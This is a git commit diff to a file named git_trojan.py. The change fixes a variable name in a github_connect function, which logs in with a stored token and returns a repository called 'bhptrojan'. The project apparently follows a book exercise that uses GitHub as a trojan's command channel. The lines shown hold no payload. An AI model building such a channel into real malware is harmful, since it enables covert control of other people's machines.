8457c8b8071e32ff2ddc7d630826d89d27b85c25
mohammed <mohammed@kali>
2024-10-04 23:26:43 +0300

    update

--- git_trojan.py
+++ git_trojan.py
@@ -13,7 +13,7 @@ def github_connect():
         token = f.read()
     user = 'mohammedhasan2'
     sess = github3.login(token=token)
-    return sess.repository(mohammedhasan2, 'bhptrojan')
+    return sess.repository(user, 'bhptrojan')
 
 def get_file_contents(dirname, module_name, repo):
     try:
